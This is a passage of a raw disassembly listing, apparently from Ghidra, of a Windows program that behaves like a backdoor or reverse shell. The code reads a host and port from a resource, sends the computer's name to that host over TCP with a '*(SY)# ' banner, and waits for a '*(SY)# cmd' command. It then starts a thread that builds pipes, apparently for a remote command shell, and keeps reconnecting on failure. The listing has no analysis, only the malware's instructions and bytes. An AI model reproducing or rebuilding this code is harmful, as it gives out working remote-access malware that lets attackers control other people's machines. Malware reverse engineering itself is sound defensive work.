        0040123d 90              ??         90h
        0040123e 90              ??         90h
        0040123f 90              ??         90h
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __stdcall FUN_00401240(HINSTANCE param_1)
                               assume FS_OFFSET = 0xffdff000
             undefined4        EAX:4          <RETURN>
             HINSTANCE         Stack[0x4]:4   param_1                                 XREF[1]:     00401240(R)
                             FUN_00401240                                    XREF[1]:     entry:00401e09(c)
        00401240 8b 44 24 04     MOV        EAX,dword ptr [ESP + param_1]
        00401244 68 ff 00        PUSH       0xff                                             int cchBufferMax for LoadStringA
                 00 00
        00401249 68 a0 30        PUSH       _Str_004030a0                                    LPSTR lpBuffer for LoadStringA
                 40 00
        0040124e 6a 01           PUSH       0x1                                              UINT uID for LoadStringA
        00401250 50              PUSH       EAX                                              HINSTANCE hInstance for LoadStri
        00401251 ff 15 e0        CALL       dword ptr [->USER32.DLL::LoadStringA]            = 000024de
                 20 40 00
        00401257 68 a0 30        PUSH       _Str_004030a0                                    = 00000000
                 40 00
        0040125c e8 5f 00        CALL       FUN_004012c0                                     undefined FUN_004012c0(void)
                 00 00
        00401261 83 c4 04        ADD        ESP,0x4
        00401264 33 c0           XOR        EAX,EAX
        00401266 c2 10 00        RET        0x10
        00401269 90 90 90        align      align(7)
                 90 90 90 90
        00401270 53              ??         53h    S
        00401271 55              ??         55h    U
        00401272 8b              ??         8Bh
        00401273 6c              ??         6Ch    l
        00401274 24              ??         24h    $
        00401275 14              ??         14h
        00401276 56              ??         56h    V
        00401277 85              ??         85h
        00401278 ed              ??         EDh
        00401279 57              ??         57h    W
        0040127a 8b              ??         8Bh
        0040127b f5              ??         F5h
        0040127c 7e              ??         7Eh    ~
        0040127d 20              ??         20h
        0040127e 8b              ??         8Bh
        0040127f 5c              ??         5Ch    \
        00401280 24              ??         24h    $
        00401281 14              ??         14h
        00401282 8b              ??         8Bh
        00401283 7c              ??         7Ch    |
        00401284 24              ??         24h    $
        00401285 18              ??         18h
        00401286 6a              ??         6Ah    j
        00401287 00              ??         00h
        00401288 56              ??         56h    V
        00401289 57              ??         57h    W
        0040128a 53              ??         53h    S
        0040128b e8              ??         E8h
        0040128c dc              ??         DCh
        0040128d 0b              ??         0Bh
        0040128e 00              ??         00h
        0040128f 00              ??         00h
        00401290 85              ??         85h
        00401291 c0              ??         C0h
        00401292 7c              ??         7Ch    |
        00401293 11              ??         11h
        00401294 74              ??         74h    t
        00401295 17              ??         17h
        00401296 2b              ??         2Bh    +
        00401297 f0              ??         F0h
        00401298 03              ??         03h
        00401299 f8              ??         F8h
        0040129a 85              ??         85h
        0040129b f6              ??         F6h
        0040129c 7f              ??         7Fh    
        0040129d e8              ??         E8h
        0040129e 5f              ??         5Fh    _
        0040129f 8b              ??         8Bh
        004012a0 c5              ??         C5h
        004012a1 5e              ??         5Eh    ^
        004012a2 5d              ??         5Dh    ]
        004012a3 5b              ??         5Bh    [
        004012a4 c3              ??         C3h
        004012a5 5f              ??         5Fh    _
        004012a6 5e              ??         5Eh    ^
        004012a7 5d              ??         5Dh    ]
        004012a8 83              ??         83h
        004012a9 c8              ??         C8h
        004012aa ff              ??         FFh
        004012ab 5b              ??         5Bh    [
        004012ac c3              ??         C3h
        004012ad 8b              ??         8Bh
        004012ae c5              ??         C5h
        004012af 5f              ??         5Fh    _
        004012b0 2b              ??         2Bh    +
        004012b1 c6              ??         C6h
        004012b2 5e              ??         5Eh    ^
        004012b3 5d              ??         5Dh    ]
        004012b4 5b              ??         5Bh    [
        004012b5 c3              ??         C3h
        004012b6 90              ??         90h
        004012b7 90              ??         90h
        004012b8 90              ??         90h
        004012b9 90              ??         90h
        004012ba 90              ??         90h
        004012bb 90              ??         90h
        004012bc 90              ??         90h
        004012bd 90              ??         90h
        004012be 90              ??         90h
        004012bf 90              ??         90h
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_004012c0(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             FUN_004012c0                                    XREF[1]:     FUN_00401240:0040125c(c)
        004012c0 56              PUSH       ESI
        004012c1 8b 35 08        MOV        ESI,dword ptr [->KERNEL32.DLL::CreateEventA]     = 00002304
                 20 40 00
        004012c7 57              PUSH       EDI
        004012c8 6a 00           PUSH       0x0                                              LPCSTR lpName for CreateEventA
        004012ca 6a 00           PUSH       0x0                                              BOOL bInitialState for CreateEve
        004012cc 6a 01           PUSH       0x1                                              BOOL bManualReset for CreateEventA
        004012ce 6a 00           PUSH       0x0                                              LPSECURITY_ATTRIBUTES lpEventAtt
        004012d0 ff d6           CALL       ESI=>KERNEL32.DLL::CreateEventA
        004012d2 6a 00           PUSH       0x0                                              LPCSTR lpName for CreateEventA
        004012d4 6a 00           PUSH       0x0                                              BOOL bInitialState for CreateEve
        004012d6 6a 01           PUSH       0x1                                              BOOL bManualReset for CreateEventA
        004012d8 6a 00           PUSH       0x0                                              LPSECURITY_ATTRIBUTES lpEventAtt
        004012da a3 d8 30        MOV        [DAT_004030d8],EAX
                 40 00
        004012df ff d6           CALL       ESI=>KERNEL32.DLL::CreateEventA
        004012e1 a3 d4 30        MOV        [DAT_004030d4],EAX
                 40 00
        004012e6 b9 4b 00        MOV        ECX,0x4b
                 00 00
        004012eb 33 c0           XOR        EAX,EAX
        004012ed bf e0 30        MOV        EDI,DAT_004030e0
                 40 00
        004012f2 f3 ab           STOSD.REP  ES:EDI=>DAT_004030e0
        004012f4 8b 44 24 0c     MOV        EAX,dword ptr [ESP + Stack[0x4]]
        004012f8 50              PUSH       EAX
        004012f9 e8 22 00        CALL       FUN_00401320                                     undefined FUN_00401320(void)
                 00 00
        004012fe 8b 0d d8        MOV        ECX,dword ptr [DAT_004030d8]
                 30 40 00
        00401304 83 c4 04        ADD        ESP,0x4
        00401307 6a 00           PUSH       0x0                                              DWORD dwMilliseconds for WaitFor
        00401309 51              PUSH       ECX                                              HANDLE hHandle for WaitForSingle
        0040130a ff 15 04        CALL       dword ptr [->KERNEL32.DLL::WaitForSingleObject]  = 000022ee
                 20 40 00
        00401310 8b 15 d8        MOV        EDX,dword ptr [DAT_004030d8]
                 30 40 00
        00401316 52              PUSH       EDX                                              HANDLE hObject for CloseHandle
        00401317 ff 15 00        CALL       dword ptr [->KERNEL32.DLL::CloseHandle]          = 000022e0
                 20 40 00
        0040131d 5f              POP        EDI
        0040131e 5e              POP        ESI
        0040131f c3              RET
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_00401320(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             undefined1        Stack[-0x294   local_294                               XREF[2]:     004013ad(*),
                                                                                                   004013ba(*)
             undefined1        Stack[-0x3a8   local_3a8                               XREF[1]:     0040135a(*)
             undefined1        Stack[-0x3bb   local_3bb                               XREF[2]:     00401391(*),
                                                                                                   004013c3(*)
             undefined4        Stack[-0x3dc   local_3dc                               XREF[2]:     004013b4(*),
                                                                                                   004013c7(W)
                             FUN_00401320                                    XREF[1]:     FUN_004012c0:004012f9(c)
        00401320 81 ec dc        SUB        ESP,0x3dc
                 03 00 00
        00401326 53              PUSH       EBX
        00401327 55              PUSH       EBP
        00401328 56              PUSH       ESI
        00401329 57              PUSH       EDI
        0040132a 6a 3a           PUSH       0x3a                                             int _Val for strchr
        0040132c 68 a0 30        PUSH       _Str_004030a0                                    char * _Str for strchr
                 40 00
        00401331 e8 92 09        CALL       MSVCRT.DLL::strchr                               char * strchr(char * _Str, int _
                 00 00
        00401336 8b d0           MOV        EDX,EAX
        00401338 33 db           XOR        EBX,EBX
        0040133a 81 ea a0        SUB        EDX,_Str_004030a0                                = 00000000
                 30 40 00
        00401340 83 c4 08        ADD        ESP,0x8
        00401343 3b d3           CMP        EDX,EBX
        00401345 0f 8e db        JLE        LAB_00401426
                 00 00 00
        0040134b 33 c0           XOR        EAX,EAX
        0040134d 3b d3           CMP        EDX,EBX
        0040134f 7e 19           JLE        LAB_0040136a
        00401351 8b ca           MOV        ECX,EDX
        00401353 be a0 30        MOV        ESI,_Str_004030a0                                = 00000000
                 40 00
        00401358 8b c1           MOV        EAX,ECX
        0040135a 8d 7c 24 44     LEA        EDI=>local_3a8,[ESP + 0x44]
        0040135e c1 e9 02        SHR        ECX,0x2
        00401361 f3 a5           MOVSD.REP  ES:EDI,ESI=>_Str_004030a0                        = 00000000
        00401363 8b c8           MOV        ECX,EAX
        00401365 83 e1 03        AND        ECX,0x3
        00401368 f3 a4           MOVSB.REP  ES:EDI,ESI=>_Str_004030a0                        = 00000000
                             LAB_0040136a                                    XREF[1]:     0040134f(j)
        0040136a 88 5c 04 44     MOV        byte ptr [ESP + EAX*0x1 + 0x44],BL
        0040136e bf a0 30        MOV        EDI,_Str_004030a0                                = 00000000
                 40 00
        00401373 83 c9 ff        OR         ECX,0xffffffff
        00401376 33 c0           XOR        EAX,EAX
        00401378 33 f6           XOR        ESI,ESI
        0040137a f2 ae           SCASB.RE   ES:EDI
        0040137c f7 d1           NOT        ECX
        0040137e 49              DEC        ECX
        0040137f 2b ca           SUB        ECX,EDX
        00401381 85 c9           TEST       ECX,ECX
        00401383 7e 21           JLE        LAB_004013a6
                             LAB_00401385                                    XREF[1]:     004013a4(j)
        00401385 8a 8c 32        MOV        CL,byte ptr [EDX + ESI*0x1 + _Str_004030a0+1]
                 a1 30 40 00
        0040138c bf a0 30        MOV        EDI,_Str_004030a0                                = 00000000
                 40 00
        00401391 88 4c 34 30     MOV        byte ptr [ESP + ESI*0x1 + local_3bb],CL
        00401395 83 c9 ff        OR         ECX,0xffffffff
        00401398 33 c0           XOR        EAX,EAX
        0040139a 46              INC        ESI
        0040139b f2 ae           SCASB.RE   ES:EDI
        0040139d f7 d1           NOT        ECX
        0040139f 49              DEC        ECX
        004013a0 2b ca           SUB        ECX,EDX
        004013a2 3b f1           CMP        ESI,ECX
        004013a4 7c df           JL         LAB_00401385
                             LAB_004013a6                                    XREF[1]:     00401383(j)
        004013a6 b9 41 00        MOV        ECX,0x41
                 00 00
        004013ab 33 c0           XOR        EAX,EAX
        004013ad 8d bc 24        LEA        EDI=>local_294,[ESP + 0x158]
                 58 01 00 00
        004013b4 8d 54 24 10     LEA        EDX=>local_3dc,[ESP + 0x10]
        004013b8 f3 ab           STOSD.REP  ES:EDI
        004013ba 8d 84 24        LEA        EAX=>local_294,[ESP + 0x158]
                 58 01 00 00
        004013c1 52              PUSH       EDX                                              LPDWORD nSize for GetComputerNameA
        004013c2 50              PUSH       EAX                                              LPSTR lpBuffer for GetComputerNa
        004013c3 88 5c 34 38     MOV        byte ptr [ESP + ESI*0x1 + local_3bb],BL
        004013c7 c7 44 24        MOV        dword ptr [ESP + local_3dc],0x104
                 18 04 01
                 00 00
        004013cf ff 15 14        CALL       dword ptr [->KERNEL32.DLL::GetComputerNameA]     = 0000232a
                 20 40 00
        004013d5 8d bc 24        LEA        EDI,[ESP + 0x158]
                 58 01 00 00
        004013dc 83 c9 ff        OR         ECX,0xffffffff
        004013df 33 c0           XOR        EAX,EAX
        004013e1 f2 ae           SCASB.RE   ES:EDI
        004013e3 f7 d1           NOT        ECX
        004013e5 49              DEC        ECX
        004013e6 88 9c 0c        MOV        byte ptr [ESP + ECX*0x1 + 0x158],BL
                 58 01 00 00
        004013ed 8d 8c 24        LEA        ECX,[ESP + 0x25c]
                 5c 02 00 00
        004013f4 51              PUSH       ECX
        004013f5 68 01 01        PUSH       0x101
                 00 00
        004013fa e8 97 0a        CALL       WS2_32.DLL::Ordinal_115                          undefined Ordinal_115()
                 00 00
        004013ff 53              PUSH       EBX
        00401400 6a 01           PUSH       0x1
        00401402 6a 02           PUSH       0x2
        00401404 e8 87 0a        CALL       WS2_32.DLL::Ordinal_23                           undefined Ordinal_23()
                 00 00
        00401409 8b e8           MOV        EBP,EAX
        0040140b 83 fd ff        CMP        EBP,-0x1
        0040140e 75 21           JNZ        LAB_00401431
        00401410 50              PUSH       EAX
        00401411 e8 74 0a        CALL       WS2_32.DLL::Ordinal_3                            undefined Ordinal_3()
                 00 00
        00401416 68 c0 27        PUSH       0x927c0                                          DWORD dwMilliseconds for Sleep
                 09 00
                             LAB_0040141b                                    XREF[1]:     0040147b(j)
        0040141b ff 15 10        CALL       dword ptr [->KERNEL32.DLL::Sleep]                = 00002322
                 20 40 00
                             LAB_00401421                                    XREF[3]:     00401542(j), 0040156c(j),
                                                                                          00401574(j)
        00401421 e8 2a 07        CALL       FUN_00401b50                                     undefined4 FUN_00401b50(void)
                 00 00
                             LAB_00401426                                    XREF[1]:     00401345(j)
        00401426 5f              POP        EDI
        00401427 5e              POP        ESI
        00401428 5d              POP        EBP
        00401429 5b              POP        EBX
        0040142a 81 c4 dc        ADD        ESP,0x3dc
                 03 00 00
        00401430 c3              RET
                             LAB_00401431                                    XREF[1]:     0040140e(j)
        00401431 8d 54 24 30     LEA        EDX,[ESP + 0x30]
        00401435 66 c7 44        MOV        word ptr [ESP + 0x14],0x2
                 24 14 02 00
        0040143c 52              PUSH       EDX                                              char * _Str for atol
        0040143d e8 80 08        CALL       MSVCRT.DLL::atol                                 long atol(char * _Str)
                 00 00
        00401442 83 c4 04        ADD        ESP,0x4
        00401445 50              PUSH       EAX
        00401446 e8 39 0a        CALL       WS2_32.DLL::Ordinal_9                            undefined Ordinal_9()
                 00 00
        0040144b 66 89 44        MOV        word ptr [ESP + 0x16],AX
                 24 16
        00401450 8d 44 24 44     LEA        EAX,[ESP + 0x44]
        00401454 50              PUSH       EAX
        00401455 e8 24 0a        CALL       WS2_32.DLL::Ordinal_11                           undefined Ordinal_11()
                 00 00
        0040145a 8d 4c 24 14     LEA        ECX,[ESP + 0x14]
        0040145e 6a 10           PUSH       0x10
        00401460 51              PUSH       ECX
        00401461 55              PUSH       EBP
        00401462 89 44 24 24     MOV        dword ptr [ESP + 0x24],EAX
        00401466 e8 0d 0a        CALL       WS2_32.DLL::Ordinal_4                            undefined Ordinal_4()
                 00 00
        0040146b 83 f8 ff        CMP        EAX,-0x1
        0040146e 75 0d           JNZ        LAB_0040147d
        00401470 55              PUSH       EBP
        00401471 e8 14 0a        CALL       WS2_32.DLL::Ordinal_3                            undefined Ordinal_3()
                 00 00
        00401476 68 e8 03        PUSH       0x3e8
                 00 00
        0040147b eb 9e           JMP        LAB_0040141b
                             LAB_0040147d                                    XREF[1]:     0040146e(j)
        0040147d b9 3f 00        MOV        ECX,0x3f
                 00 00
        00401482 33 c0           XOR        EAX,EAX
        00401484 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        00401488 8d 54 24 58     LEA        EDX,[ESP + 0x58]
        0040148c f3 ab           STOSD.REP  ES:EDI
        0040148e 66 ab           STOSW      ES:EDI
        00401490 aa              STOSB      ES:EDI
        00401491 bf 60 30        MOV        EDI,s_*(SY)#_00403060                            = "*(SY)# "
                 40 00
        00401496 83 c9 ff        OR         ECX,0xffffffff
        00401499 33 c0           XOR        EAX,EAX
        0040149b 53              PUSH       EBX
        0040149c f2 ae           SCASB.RE   ES:EDI=>s_*(SY)#_00403060                        = "*(SY)# "
        0040149e f7 d1           NOT        ECX
        004014a0 2b f9           SUB        EDI,ECX
        004014a2 8b c1           MOV        EAX,ECX
        004014a4 8b f7           MOV        ESI,EDI
        004014a6 8b fa           MOV        EDI,EDX
        004014a8 8d 54 24 5c     LEA        EDX,[ESP + 0x5c]
        004014ac c1 e9 02        SHR        ECX,0x2
        004014af f3 a5           MOVSD.REP  ES:EDI,ESI=>s_*(SY)#_00403060                    = "*(SY)# "
        004014b1 8b c8           MOV        ECX,EAX
        004014b3 33 c0           XOR        EAX,EAX
        004014b5 83 e1 03        AND        ECX,0x3
        004014b8 f3 a4           MOVSB.REP  ES:EDI,ESI=>s_*(SY)#_00403060                    = "*(SY)# "
        004014ba 8d bc 24        LEA        EDI,[ESP + 0x15c]
                 5c 01 00 00
        004014c1 83 c9 ff        OR         ECX,0xffffffff
        004014c4 f2 ae           SCASB.RE   ES:EDI
        004014c6 f7 d1           NOT        ECX
        004014c8 2b f9           SUB        EDI,ECX
        004014ca 8b f7           MOV        ESI,EDI
        004014cc 8b fa           MOV        EDI,EDX
        004014ce 8b d1           MOV        EDX,ECX
        004014d0 83 c9 ff        OR         ECX,0xffffffff
        004014d3 f2 ae           SCASB.RE   ES:EDI
        004014d5 8b ca           MOV        ECX,EDX
        004014d7 4f              DEC        EDI
        004014d8 c1 e9 02        SHR        ECX,0x2
        004014db f3 a5           MOVSD.REP  ES:EDI,ESI
        004014dd 8b ca           MOV        ECX,EDX
        004014df 83 e1 03        AND        ECX,0x3
        004014e2 f3 a4           MOVSB.REP  ES:EDI,ESI
        004014e4 8d 7c 24 5c     LEA        EDI,[ESP + 0x5c]
        004014e8 83 c9 ff        OR         ECX,0xffffffff
        004014eb f2 ae           SCASB.RE   ES:EDI
        004014ed f7 d1           NOT        ECX
        004014ef 49              DEC        ECX
        004014f0 8d 7c 24 5c     LEA        EDI,[ESP + 0x5c]
        004014f4 88 5c 0c 5c     MOV        byte ptr [ESP + ECX*0x1 + 0x5c],BL
        004014f8 83 c9 ff        OR         ECX,0xffffffff
        004014fb f2 ae           SCASB.RE   ES:EDI
        004014fd f7 d1           NOT        ECX
        004014ff 49              DEC        ECX
        00401500 8d 44 24 5c     LEA        EAX,[ESP + 0x5c]
        00401504 51              PUSH       ECX
        00401505 50              PUSH       EAX
        00401506 55              PUSH       EBP
        00401507 e8 60 09        CALL       WS2_32.DLL::Ordinal_19                           undefined Ordinal_19()
                 00 00
        0040150c 8b f0           MOV        ESI,EAX
        0040150e 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        00401512 83 c9 ff        OR         ECX,0xffffffff
        00401515 33 c0           XOR        EAX,EAX
        00401517 f2 ae           SCASB.RE   ES:EDI
        00401519 f7 d1           NOT        ECX
        0040151b 49              DEC        ECX
        0040151c 51              PUSH       ECX
        0040151d 8d 4c 24 28     LEA        ECX,[ESP + 0x28]
        00401521 68 54 30        PUSH       s_send_=_%d_00403054                             char * _Format for sprintf
                 40 00
        00401526 51              PUSH       ECX                                              char * _Dest for sprintf
        00401527 e8 90 07        CALL       MSVCRT.DLL::sprintf                              int sprintf(char * _Dest, char *
                 00 00
        0040152c 56              PUSH       ESI
        0040152d 8d 54 24 34     LEA        EDX,[ESP + 0x34]
        00401531 68 54 30        PUSH       s_send_=_%d_00403054                             char * _Format for sprintf
                 40 00
        00401536 52              PUSH       EDX                                              char * _Dest for sprintf
        00401537 e8 80 07        CALL       MSVCRT.DLL::sprintf                              int sprintf(char * _Dest, char *
                 00 00
        0040153c 83 c4 18        ADD        ESP,0x18
        0040153f 83 fe ff        CMP        ESI,-0x1
        00401542 0f 84 d9        JZ         LAB_00401421
                 fe ff ff
        00401548 b9 3f 00        MOV        ECX,0x3f
                 00 00
        0040154d 33 c0           XOR        EAX,EAX
        0040154f 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        00401553 53              PUSH       EBX
        00401554 f3 ab           STOSD.REP  ES:EDI
        00401556 66 ab           STOSW      ES:EDI
        00401558 aa              STOSB      ES:EDI
        00401559 8d 44 24 5c     LEA        EAX,[ESP + 0x5c]
        0040155d 68 ff 00        PUSH       0xff
                 00 00
        00401562 50              PUSH       EAX
        00401563 55              PUSH       EBP
        00401564 e8 09 09        CALL       WS2_32.DLL::Ordinal_16                           undefined Ordinal_16()
                 00 00
        00401569 83 f8 ff        CMP        EAX,-0x1
        0040156c 0f 84 af        JZ         LAB_00401421
                 fe ff ff
                             LAB_00401572                                    XREF[1]:     004015ce(j)
        00401572 3b c3           CMP        EAX,EBX
        00401574 0f 8e a7        JLE        LAB_00401421
                 fe ff ff
        0040157a 6a 06           PUSH       0x6                                              size_t _MaxCount for _strnicmp
        0040157c 8d 4c 24 5c     LEA        ECX,[ESP + 0x5c]
        00401580 68 4c 30        PUSH       s_*(SY)#_0040304c                                char * _Str2 for _strnicmp
                 40 00
        00401585 51              PUSH       ECX                                              char * _Str1 for _strnicmp
        00401586 e8 2b 07        CALL       MSVCRT.DLL::_strnicmp                            int _strnicmp(char * _Str1, char
                 00 00
        0040158b 83 c4 0c        ADD        ESP,0xc
        0040158e 85 c0           TEST       EAX,EAX
        00401590 75 5d           JNZ        LAB_004015ef
        00401592 6a 0a           PUSH       0xa                                              size_t _MaxCount for _strnicmp
        00401594 8d 54 24 5c     LEA        EDX,[ESP + 0x5c]
        00401598 68 40 30        PUSH       s_*(SY)#_cmd_00403040                            char * _Str2 for _strnicmp
                 40 00
        0040159d 52              PUSH       EDX                                              char * _Str1 for _strnicmp
        0040159e e8 13 07        CALL       MSVCRT.DLL::_strnicmp                            int _strnicmp(char * _Str1, char
                 00 00
        004015a3 83 c4 0c        ADD        ESP,0xc
        004015a6 85 c0           TEST       EAX,EAX
        004015a8 74 36           JZ         LAB_004015e0
        004015aa b9 3f 00        MOV        ECX,0x3f
                 00 00
        004015af 33 c0           XOR        EAX,EAX
        004015b1 8d 7c 24 58     LEA        EDI,[ESP + 0x58]
        004015b5 53              PUSH       EBX
        004015b6 f3 ab           STOSD.REP  ES:EDI
        004015b8 66 ab           STOSW      ES:EDI
        004015ba aa              STOSB      ES:EDI
        004015bb 8d 44 24 5c     LEA        EAX,[ESP + 0x5c]
        004015bf 68 ff 00        PUSH       0xff
                 00 00
        004015c4 50              PUSH       EAX
        004015c5 55              PUSH       EBP
        004015c6 e8 a7 08        CALL       WS2_32.DLL::Ordinal_16                           undefined Ordinal_16()
                 00 00
        004015cb 83 f8 ff        CMP        EAX,-0x1
        004015ce 75 a2           JNZ        LAB_00401572
        004015d0 e8 7b 05        CALL       FUN_00401b50                                     undefined4 FUN_00401b50(void)
                 00 00
        004015d5 5f              POP        EDI
        004015d6 5e              POP        ESI
        004015d7 5d              POP        EBP
        004015d8 5b              POP        EBX
        004015d9 81 c4 dc        ADD        ESP,0x3dc
                 03 00 00
        004015df c3              RET
                             LAB_004015e0                                    XREF[1]:     004015a8(j)
        004015e0 55              PUSH       EBP                                              void * _ArgList for _beginthread
        004015e1 53              PUSH       EBX                                              uint _StackSize for _beginthread
        004015e2 68 f0 16        PUSH       _StartAddress_004016f0                           _StartAddress * _StartAddress fo
                 40 00
        004015e7 e8 c4 06        CALL       MSVCRT.DLL::_beginthread                         uintptr_t _beginthread(_StartAdd
                 00 00
        004015ec 83 c4 0c        ADD        ESP,0xc
                             LAB_004015ef                                    XREF[1]:     00401590(j)
        004015ef 53              PUSH       EBX                                              DWORD dwExitCode for ExitThread
        004015f0 ff 15 0c        CALL       dword ptr [->KERNEL32.DLL::ExitThread]           = 00002314
                 20 40 00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
             assume FS_OFFSET = <UNKNOWN>
        004015f6 90 90 90        align      align(10)
                 90 90 90
                 90 90 90 90
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             PHANDLE __stdcall FUN_00401600(void)
                               assume FS_OFFSET = 0xffdff000
             PHANDLE           EAX:4          <RETURN>
             undefined4        Stack[-0x4]:4  local_4                                 XREF[1]:     00401654(W)
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     0040164c(W)
             undefined4        Stack[-0xc]:4  local_c                                 XREF[3]:     00401628(*),
                                                                                                   00401644(W),
                                                                                                   00401662(*)
             undefined4        Stack[-0x10]:4 local_10                                XREF[5]:     00401610(W),
                                                                                                   0040162e(*),
                                                                                                   00401684(R),
                                                                                                   004016b5(R),
                                                                                                   004016d7(R)
             undefined4        Stack[-0x14]:4 local_14                                XREF[5]:     00401608(W),
                                                                                                   00401669(*),
                                                                                                   00401698(R),
                                                                                                   004016b9(R),
                                                                                                   004016d0(R)
                             FUN_00401600                                    XREF[1]:     _StartAddress_004016f0:004016ff(
        00401600 83 ec 14        SUB        ESP,0x14
        00401603 53              PUSH       EBX
        00401604 56              PUSH       ESI
        00401605 57              PUSH       EDI
        00401606 6a 18           PUSH       0x18                                             size_t _Size for malloc
        00401608 c7 44 24        MOV        dword ptr [ESP + local_14],0x0
                 10 00 00
                 00 00
        00401610 c7 44 24        MOV        dword ptr [ESP + local_10],0x0
                 14 00 00
                 00 00
        00401618 e8 b7 06        CALL       MSVCRT.DLL::malloc                               void * malloc(size_t _Size)
                 00 00
        0040161d 8b 1d 18        MOV        EBX,dword ptr [->KERNEL32.DLL::CreatePipe]       = 0000233e
                 20 40 00
        00401623 83 c4 04        ADD        ESP,0x4
        00401626 8b f0           MOV        ESI,EAX
        00401628 8d 44 24 14     LEA        EAX=>local_c,[ESP + 0x14]
        0040162c 6a 00           PUSH       0x0                                              DWORD nSize for CreatePipe
        0040162e 8d 4c 24 14     LEA        ECX=>local_10,[ESP + 0x14]
        00401632 8d 7e 04        LEA        EDI,[ESI + 0x4]
        00401635 50              PUSH       EAX                                              LPSECURITY_ATTRIBUTES lpPipeAttr
        00401636 51              PUSH       ECX                                              PHANDLE hWritePipe for CreatePipe
        00401637 c7 06 00        MOV        dword ptr [ESI],0x0
                 00 00 00
        0040163d c7 07 00        MOV        dword ptr [EDI],0x0
                 00 00 00
        00401643 56              PUSH       ESI                                              PHANDLE hReadPipe for CreatePipe
        00401644 c7 44 24        MOV        dword ptr [ESP + local_c],0xc
                 24 0c 00
                 00 00
        0040164c c7 44 24        MOV        dword ptr [ESP + local_8],0x0
                 28 00 00
                 00 00
        00401654 c7 44 24        MOV        dword ptr [ESP + local_4],0x1
                 2c 01 00
                 00 00
        0040165c ff d3           CALL       EBX=>KERNEL32.DLL::CreatePipe
        0040165e 85 c0           TEST       EAX,EAX
        00401660 74 13           JZ         LAB_00401675
        00401662 8d 54 24 14     LEA        EDX=>local_c,[ESP + 0x14]
        00401666 6a 00           PUSH       0x0                                              DWORD nSize for CreatePipe
        00401668 52              PUSH       EDX                                              LPSECURITY_ATTRIBUTES lpPipeAttr
        00401669 8d 44 24 14     LEA        EAX=>local_14,[ESP + 0x14]
        0040166d 57              PUSH       EDI                                              PHANDLE hWritePipe for CreatePipe
        0040166e 50              PUSH       EAX                                              PHANDLE hReadPipe for CreatePipe
        0040166f ff d3           CALL       EBX=>KERNEL32.DLL::CreatePipe
        00401671 85 c0           TEST       EAX,EAX
        00401673 75 40           JNZ        LAB_004016b5
                             LAB_00401675                                    XREF[1]:     00401660(j)
        00401675 8b 06           MOV        EAX,dword ptr [ESI]
        00401677 8b 1d 00        MOV        EBX,dword ptr [->KERNEL32.DLL::CloseHandle]      = 000022e0
                 20 40 00
        0040167d 85 c0           TEST       EAX,EAX
        0040167f 74 03           JZ         LAB_00401684
        00401681 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        00401682 ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_00401684                                    XREF[1]:     0040167f(j)
        00401684 8b 44 24 10     MOV        EAX,dword ptr [ESP + local_10]
        00401688 85 c0           TEST       EAX,EAX
        0040168a 74 03           JZ         LAB_0040168f
        0040168c 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        0040168d ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_0040168f                                    XREF[1]:     0040168a(j)
        0040168f 8b 3f           MOV        EDI,dword ptr [EDI]
        00401691 85 ff           TEST       EDI,EDI
        00401693 74 03           JZ         LAB_00401698
        00401695 57              PUSH       EDI                                              HANDLE hObject for CloseHandle
        00401696 ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_00401698                                    XREF[1]:     00401693(j)
        00401698 8b 44 24 0c     MOV        EAX,dword ptr [ESP + local_14]
        0040169c 85 c0           TEST       EAX,EAX
        0040169e 74 03           JZ         LAB_004016a3
        004016a0 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        004016a1 ff d3           CALL       EBX=>KERNEL32.DLL::CloseHandle
                             LAB_004016a3                                    XREF[1]:     0040169e(j)
        004016a3 56              PUSH       ESI                                              void * _Memory for free
        004016a4 e8 25 06        CALL       MSVCRT.DLL::free                                 void free(void * _Memory)
                 00 00
        004016a9 83 c4 04        ADD        ESP,0x4
        004016ac 33 c0           XOR        EAX,EAX
        004016ae 5f              POP        EDI
        004016af 5e              POP        ESI
        004016b0 5b              POP        EBX
        004016b1 83 c4 14        ADD        ESP,0x14
        004016b4 c3              RET
                             LAB_004016b5                                    XREF[1]:     00401673(j)
        004016b5 8b 4c 24 10     MOV        ECX,dword ptr [ESP + local_10]
        004016b9 8b 54 24 0c     MOV        EDX,dword ptr [ESP + local_14]
        004016bd 51              PUSH       ECX
        004016be 52              PUSH       EDX
        004016bf e8 9c 01        CALL       FUN_00401860                                     HANDLE FUN_00401860(HANDLE param
                 00 00
        004016c4 8b 3d 00        MOV        EDI,dword ptr [->KERNEL32.DLL::CloseHandle]      = 000022e0
                 20 40 00
        004016ca 83 c4 08        ADD        ESP,0x8
        004016cd 89 46 08        MOV        dword ptr [ESI + 0x8],EAX
        004016d0 8b 44 24 0c     MOV        EAX,dword ptr [ESP + local_14]
        004016d4 50              PUSH       EAX                                              HANDLE hObject for CloseHandle
        004016d5 ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        004016d7 8b 4c 24 10     MOV        ECX,dword ptr [ESP + local_10]
        004016db 51              PUSH       ECX                                              HANDLE hObject for CloseHandle
        004016dc ff d7           CALL       EDI=>KERNEL32.DLL::CloseHandle
        004016de 8b c6           MOV        EAX,ESI
        004016e0 5f              POP        EDI
        004016e1 5e              POP        ESI
        004016e2 5b              POP        EBX
        004016e3 83 c4 14        ADD        ESP,0x14
        004016e6 c3              RET
        004016e7 90 90 90        align      align(9)
                 90 90 90
                 90 90 90
                             **************************************************************
                             * _StartAddress parameter of _beginthread                    *
                             *                                                            *
